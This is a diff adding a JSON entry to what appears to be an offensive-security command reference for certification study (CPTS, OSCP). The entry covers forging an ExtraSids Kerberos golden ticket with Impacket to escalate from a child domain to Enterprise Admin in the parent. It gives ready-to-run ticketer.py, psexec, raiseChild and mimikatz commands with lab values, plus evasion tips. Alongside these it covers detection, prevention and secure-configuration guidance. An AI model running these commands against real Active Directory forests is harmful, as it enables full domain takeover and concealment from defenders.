@@ -1,0 +1,87 @@
+{
+  "id": "ad-ticketer-extrasids",
+  "name": "ticketer.py - Forge ExtraSids Golden Ticket (Child→Parent)",
+  "command": "ticketer.py -nthash <child_krbtgt_hash> -domain <child_domain> -domain-sid <child_sid> -extra-sid <parent_EA_sid> Administrator",
+  "description": "Forges a golden ticket with the ExtraSids extension — includes the parent domain's Enterprise Admins SID in the ticket's SID history. This makes the forged child-domain ticket be treated as Enterprise Admin in the parent domain. Enables full parent domain compromise from a child domain KRBTGT hash alone.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Privilege Escalation",
+  "subcategory": "Domain Trusts",
+  "certifications": [
+    "CPTS",
+    "OSCP",
+    "CRTP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 13: Active Directory Enumeration & Attacks",
+  "tags": [
+    "golden-ticket",
+    "extrasids",
+    "domain-trust",
+    "child-parent",
+    "kerberos",
+    "impacket"
+  ],
+  "mitre": [
+    "T1134.005",
+    "T1558.001"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE EXTRASIDS ATTACK (CHILD → PARENT) ===\nWhen you compromise a child domain (LOGISTICS.INLANEFREIGHT.LOCAL), you can\nescalate to the parent domain (INLANEFREIGHT.LOCAL) without any credentials there.\n\nHow: Kerberos SID history allows tickets to include SIDs from previous migrations.\nBy adding the parent domain's Enterprise Admins SID (RID 519) to the SID history\nof a forged child domain golden ticket, the parent DC sees Enterprise Admin rights.\n\n=== WHAT YOU NEED ===\n  1. Child domain KRBTGT NT hash (from secretsdump of child DC)\n  2. Child domain SID (lookupsid.py or Get-DomainSID)\n  3. Parent domain Enterprise Admins SID:\n     → lookupsid.py against parent DC → find RID 519\n     → S-1-5-21-[PARENT-DOMAIN-SID]-519\n  4. Any username to put in the ticket (Administrator is traditional)\n\n=== ARGUMENTS ===\n  -nthash         → child KRBTGT NT hash\n  -domain         → child domain FQDN\n  -domain-sid     → child domain SID (S-1-5-21-...)\n  -extra-sid      → parent's Enterprise Admins SID (S-1-5-21-[parent]-519)\n  Administrator   → username to put in the ticket (doesn't need to exist!)\n\nOutput: Administrator.ccache\n\n=== USING THE TICKET ===\nexport KRB5CCNAME=Administrator.ccache\npsexec.py LOGISTICS.INLANEFREIGHT.LOCAL/Administrator@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL \\\n  -k -no-pass -target-ip 172.16.5.5\n\n=== AUTOMATED ALTERNATIVE ===\nraiseChild.py -target-exec <parent_dc_ip> <child_domain>/<child_admin>:<pass>\nDoes all of the above automatically: dumps child KRBTGT, builds ExtraSids ticket,\nexecutes on parent DC.\n\n=== MIMIKATZ EQUIVALENT ===\nkerberos::golden /user:Administrator /domain:LOGISTICS.INLANEFREIGHT.LOCAL\n  /sid:S-1-5-21-[child] /krbtgt:<hash> /sids:S-1-5-21-[parent]-519 /ptt\n\n=== WHY PARENT DOMAIN IS FULLY COMPROMISED ===\nEnterprise Admins have full rights over ALL domains in the forest — including\nadding accounts to Domain Admins everywhere, modifying all objects, and DCSync.",
+  "examples": [
+    {
+      "label": "Forge ExtraSids ticket",
+      "command": "ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 Administrator"
+    },
+    {
+      "label": "Export ticket and psexec to parent DC",
+      "command": "export KRB5CCNAME=Administrator.ccache\npsexec.py LOGISTICS.INLANEFREIGHT.LOCAL/Administrator@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL -k -no-pass -target-ip 172.16.5.5"
+    }
+  ],
+  "references": [
+    {
+      "title": "Impacket ticketer.py",
+      "url": "https://github.com/fortra/impacket/blob/master/examples/ticketer.py"
+    },
+    {
+      "title": "SID History Attack (harmj0y)",
+      "url": "http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-ntdsdit-oh-my/"
+    },
+    {
+      "title": "HTB Academy - Active Directory Enumeration & Attacks",
+      "url": "https://academy.hackthebox.com/module/details/143"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-psexec-ticket",
+      "note": "Use the forged ticket to get a SYSTEM shell on the parent DC.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "ticketer.py forges a Kerberos TGT for the child domain (signed with child KRBTGT hash) and inserts the parent domain's Enterprise Admins SID (S-1-5-21-[parent]-519) into the PAC's ExtraSids field (SID history). When this ticket is used across the parent-child trust, the parent's KDC processes the inter-realm referral and reads the ExtraSids field — because SID history is honoured in trust transitions by default, the parent grants Enterprise Admin privileges. The ticket is saved as a .ccache file and used via KRB5CCNAME.",
+    "prerequisites": "Child domain KRBTGT NT hash (from DCSync of child DC). Child domain SID. Parent domain's Enterprise Admins SID (S-1-5-21-[parent]-519 — obtained via lookupsid.py against parent DC). Linux host with Impacket. DNS or /etc/hosts entry for parent DC FQDN.",
+    "impact": "Forged ticket granting Enterprise Admin rights in the parent (root) domain — full forest compromise. From this ticket: psexec to parent DC → SYSTEM shell → DCSync the entire parent domain → golden ticket for parent persistence. All parent-domain resources and child domain resources are now accessible.",
+    "detection": "Kerberos cross-realm authentication events on the parent DC with anomalous PAC content (SID history field containing SIDs not belonging to the child domain). Event 4768/4769 on both child and parent DCs with cross-forest referral chain. Microsoft Defender for Identity detects ExtraSids attacks specifically — the PAC SID value (519) from a child-domain principal is anomalous. The .ccache file on the attacker's Linux disk is also an artifact.",
+    "artifacts": "Administrator.ccache ticket file on attacker's disk; KRB5CCNAME environment variable; Event 4768 (TGT request) on child DC; cross-realm Kerberos referral traffic; Event 4769 on parent DC with child-domain principal requesting parent resources; subsequent Event 4624 + 7045 on parent DC if psexec follows.",
+    "prevention": "Enable SID Filtering on the parent-child trust (neutralises ExtraSids by stripping non-domain SIDs from PAC). This is the most direct mitigation — note it may break some legitimate cross-domain resource access scenarios; test before deploying in production. Reset child domain KRBTGT to prevent DCSync data being leveraged. Deploy MDI across all forest domains. Treat child domain compromise as a forest-level incident requiring full investigation.",
+    "evasion": "Ticket exists only on the Linux attacker's filesystem as a .ccache — no Windows memory artifacts until used. KRB5CCNAME env var sets which ticket is used; rename the file to something less obvious. Operate quickly after forging — the ticket has a default 10-hour lifetime (set explicitly if needed to match policy). Combine with -aes256 key option for AES tickets if the AES key was extracted during DCSync.",
+    "sources": [
+      "HTB M13",
+      "MITRE T1134.005",
+      "MITRE T1558.001"
+    ],
+    "misconfiguration": "Domain trusts (especially bidirectional and forest trusts) extend authentication boundaries. SID filtering is often disabled on forest trusts to support legacy applications — but this allows an attacker with Domain Admin in a child domain to forge a golden ticket with ExtraSids claiming Domain Admin SID in the parent/trusted forest. Without SID filtering (SIDHistory filtering), domain boundaries offer no security isolation.",
+    "vulnerable_config": "# Bidirectional forest trust without SID filtering:\nGet-ADTrust -Filter * | Select-Object Name, Direction, SIDFilteringQuarantined\n# SIDFilteringQuarantined: False  <-- SID filtering DISABLED\n# Direction: BiDirectional        <-- both domains trust each other\n\n# Child domain to parent: SID filtering is always disabled by default\n# Enterprise Admin SID (S-1-5-21-<root>-519) can be added to ExtraSids\n# Golden ticket with ExtraSids = cross-domain privilege escalation",
+    "secure_config": "# Enable SID filtering on external/forest trusts:\nnetdom trust <TrustingDomain> /domain:<TrustedDomain> /quarantine:yes\n# 'Quarantine' = SID filtering enabled — ExtraSids from other domain are stripped\n\n# For child-to-parent trusts (SID filtering can't be enabled without breaking functionality):\n# Use Selective Authentication instead of full trust\n# Only accounts explicitly granted 'Allowed to Authenticate' can use the trust\nnetdom trust <ParentDomain> /domain:<ChildDomain> /SelectiveAuth:yes\n\n# Restrict SIDHistory (prevents ExtraSids abuse):\n# Audit accounts with SIDHistory:\nGet-ADUser -Filter {SIDHistory -like '*'} -Properties SIDHistory\n\n# Monitor cross-forest authentication:\n# Event 4769 on parent DC with ticket from child domain user"
+  },
+  "tools": [
+    "impacket"
+  ]
+}
